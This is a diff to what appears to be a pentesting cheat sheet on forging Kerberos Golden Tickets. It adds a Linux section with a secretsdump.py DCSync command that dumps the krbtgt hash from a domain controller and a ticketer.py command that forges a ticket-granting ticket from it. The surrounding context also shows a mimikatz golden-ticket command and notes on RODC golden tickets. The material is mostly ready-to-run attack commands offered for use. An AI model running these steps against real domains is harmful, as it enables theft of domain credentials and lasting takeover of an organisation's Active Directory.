@@ -18,6 +18,16 @@ With a DCSync
 
     mimikatz "kerberos::golden /user:ADMIN_USER /domain:DOMAIN /sid:DOMAIN-SID /aes256:KRBTGT_AES256 /ptt"
 
+## Linux
+
+### 1) Dump krbtgt has with DCSync
+
+    secretsdump.py -just-dc-user 'krbtgt' -just-dc-ntlm domain.local/administrator:password@<DC>
+
+### 2) Create TGT
+
+    ticketer.py -domain domain.local -domain-sid <domain_SID> -nthash <krbtgt_hash> -user-id <target_RID> -duration <ticket_lifetime_in_day> <target_user>
+
 # RODC Golden ticket
 
 In case of a RODC, it is still possible to forge a Golden Ticket but the KRBTGT's version number is needed and only the accounts allowed to authenticate can be specified in the ticket (according to the msDS-RevealOnDemandGroup and msDS-NeverRevealGroup lists).
